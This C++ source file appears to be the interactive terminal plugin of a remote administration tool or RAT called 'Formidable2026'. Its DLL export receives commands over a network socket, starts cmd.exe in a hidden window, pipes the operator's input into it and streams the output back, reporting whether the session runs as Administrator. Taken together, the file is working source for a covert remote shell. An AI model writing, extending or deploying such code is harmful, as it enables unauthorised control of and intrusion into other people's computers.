/**
 * Formidable2026 - Terminal Module (DLL)
 * Encoding: UTF-8 BOM
 */
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <windows.h>
#include <process.h>
#include <string>
#include <vector>
#include "../../Common/Config.h"

using namespace Formidable;

// 权限检查辅助函数
bool IsAdminLocal() {
    BOOL bIsAdmin = FALSE;
    PSID pAdministratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        CheckTokenMembership(NULL, pAdministratorsGroup, &bIsAdmin);
        FreeSid(pAdministratorsGroup);
    }
    return bIsAdmin == TRUE;
}

// 全局状态管理
static HANDLE hReadPipeIn = NULL;
static HANDLE hWritePipeIn = NULL;
static HANDLE hReadPipeOut = NULL;
static HANDLE hWritePipeOut = NULL;
static HANDLE hProcess = NULL;
static HANDLE hThreadRead = NULL;
static SOCKET g_socket = INVALID_SOCKET;
static bool bRunning = false;

void SendResponse(SOCKET s, uint32_t cmd, const void* data, int len) {
    PkgHeader header;
    memcpy(header.flag, "FRMD26?", 7);
    header.originLen = sizeof(CommandPkg) - 1 + len;
    header.totalLen = sizeof(PkgHeader) + header.originLen;

    std::vector<char> buffer(header.totalLen);
    memcpy(buffer.data(), &header, sizeof(PkgHeader));

    CommandPkg* pkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
    pkg->cmd = cmd;
    pkg->arg1 = len;
    if (len > 0 && data) {
        memcpy(pkg->data, data, len);
    }

    send(s, buffer.data(), (int)buffer.size(), 0);
}



// Helper to convert data to UTF-8 (Now assumes input is UTF-8 from chcp 65001)
std::string ToUtf8(const char* data, int len) {
    if (len <= 0) return "";
    // Since we use chcp 65001, the data is already UTF-8
    return std::string(data, len);
}

// Forward declaration
bool StartCmdProcess(SOCKET s);

unsigned __stdcall ReadPipeThread(void* pParam) {
    char buffer[4096];
    DWORD bytesRead;
    bool headerSent = false;
    int outputCount = 0; // 计数输出次数
    
    while (bRunning) {
        if (ReadFile(hReadPipeOut, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            
            // 前两次输出包含chcp切换信息，跳过
            outputCount++;
            if (outputCount <= 2) {
                if (!headerSent) {
                    // 在跳过初始输出后发送欢迎消息
                    std::string startMsg = "Interactive Terminal Opened\r\n";
                    startMsg += "--------------------------------------------------\r\n";
                    startMsg += "[System] Remote terminal started...\r\n";
                    startMsg += "[System] Current privileges: ";
                    startMsg += IsAdminLocal() ? "Administrator\r\n" : "User\r\n";
                    startMsg += "--------------------------------------------------\r\n\r\n";
                    SendResponse(g_socket, CMD_TERMINAL_DATA, startMsg.c_str(), (int)startMsg.size());
                    headerSent = true;
                }
                continue; // 跳过chcp输出
            }
            
            // 发送实际的终端输出
            SendResponse(g_socket, CMD_TERMINAL_DATA, buffer, (int)bytesRead);
        } else {
            DWORD dwErr = GetLastError();
            if (dwErr == ERROR_BROKEN_PIPE || dwErr == ERROR_INVALID_HANDLE) {
                // Pipe broken or invalid handle - terminal process has likely exited
                std::string pipeMsg = "[System] 终端进程已退出。\r\n";
                SendResponse(g_socket, CMD_TERMINAL_DATA, pipeMsg.c_str(), (int)pipeMsg.size());
                break;
            }
            Sleep(10);
        }
    }
    
    std::string exitMsg = "[System] 远程终端已关闭。\r\n";
    SendResponse(g_socket, CMD_TERMINAL_DATA, exitMsg.c_str(), (int)exitMsg.size());

    return 0;
}

void CloseTerminal() {
    bRunning = false;
    if (hProcess) {
        TerminateProcess(hProcess, 0);
        CloseHandle(hProcess);
        hProcess = NULL;
    }
    if (hThreadRead) {
        // Force thread to exit if it's blocked on ReadFile
        CancelSynchronousIo(hThreadRead); 
        WaitForSingleObject(hThreadRead, 1000);
        CloseHandle(hThreadRead);
        hThreadRead = NULL;
    }
    if (hReadPipeIn) CloseHandle(hReadPipeIn);
    if (hWritePipeIn) CloseHandle(hWritePipeIn);
    if (hReadPipeOut) CloseHandle(hReadPipeOut);
    if (hWritePipeOut) CloseHandle(hWritePipeOut);
    hReadPipeIn = hWritePipeIn = hReadPipeOut = hWritePipeOut = NULL;
}

// Helper function to start cmd.exe process
bool StartCmdProcess(SOCKET s) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    
    // 创建输出管道 (Child stdout -> Parent)
    if (!CreatePipe(&hReadPipeOut, &hWritePipeOut, &sa, 0)) {
        SendResponse(s, CMD_TERMINAL_DATA, "[Error] Failed to create output pipe\r\n", 37);
        return false;
    }
    // 确保父进程读取端不被继承
    SetHandleInformation(hReadPipeOut, HANDLE_FLAG_INHERIT, 0);

    // 创建输入管道 (Parent -> Child stdin)
    if (!CreatePipe(&hReadPipeIn, &hWritePipeIn, &sa, 0)) {
        SendResponse(s, CMD_TERMINAL_DATA, "[Error] Failed to create input pipe\r\n", 36);
        CloseHandle(hReadPipeOut);
        CloseHandle(hWritePipeOut);
        return false;
    }
    // 确保父进程写入端不被继承
    SetHandleInformation(hWritePipeIn, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = hReadPipeIn;
    si.hStdOutput = hWritePipeOut;
    si.hStdError = hWritePipeOut;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = { 0 };
    // 强制使用 UTF-8 编码 (chcp 65001)
    wchar_t cmdLine[] = L"cmd.exe /Q /K chcp 65001";

    if (!CreateProcessW(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        DWORD err = GetLastError();
        char errMsg[128];
        sprintf_s(errMsg, "[Error] CreateProcess failed: %d\r\n", err);
        SendResponse(s, CMD_TERMINAL_DATA, errMsg, (int)strlen(errMsg));
        
        CloseHandle(hReadPipeOut);
        CloseHandle(hWritePipeOut);
        CloseHandle(hReadPipeIn);
        CloseHandle(hWritePipeIn);
        hReadPipeOut = hWritePipeOut = hReadPipeIn = hWritePipeIn = NULL;
        return false;
    }

    hProcess = pi.hProcess;
    CloseHandle(pi.hThread);

    // 关闭子进程端句柄 (父进程不需要)
    CloseHandle(hWritePipeOut); 
    CloseHandle(hReadPipeIn);   
    hWritePipeOut = NULL;
    hReadPipeIn = NULL;

    return true;
}

bool OpenTerminal(SOCKET s) {
    // If already running, close first to ensure a fresh start
    if (bRunning) {
        CloseTerminal();
    }

    if (!StartCmdProcess(s)) {
        return false;
    }

    g_socket = s;
    bRunning = true;
    hThreadRead = (HANDLE)_beginthreadex(NULL, 0, ReadPipeThread, NULL, 0, NULL);

    return true;
}

// Entry point for the DLL
extern "C" __declspec(dllexport) void WINAPI ModuleEntry(SOCKET s, CommandPkg* pkg) {
    if (pkg->cmd == CMD_LOAD_MODULE || pkg->cmd == CMD_TERMINAL_OPEN) {
        if (OpenTerminal(s)) {
            std::string msg = "Interactive Terminal Opened\r\n";
            SendResponse(s, CMD_TERMINAL_OPEN, msg.c_str(), (int)msg.size());
        } else {
            std::string msg = "Failed to open terminal\r\n";
            SendResponse(s, CMD_TERMINAL_OPEN, msg.c_str(), (int)msg.size());
        }
    } else if (pkg->cmd == CMD_TERMINAL_DATA) {
        if (bRunning && hWritePipeIn) {
            // Since we use chcp 65001, we can send UTF-8 directly
            DWORD bytesWritten;
            WriteFile(hWritePipeIn, pkg->data, (DWORD)pkg->arg1, &bytesWritten, NULL);
        }
    } else if (pkg->cmd == CMD_TERMINAL_CLOSE) {
        CloseTerminal();
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_DETACH) {
        CloseTerminal();
    }
    return TRUE;
}
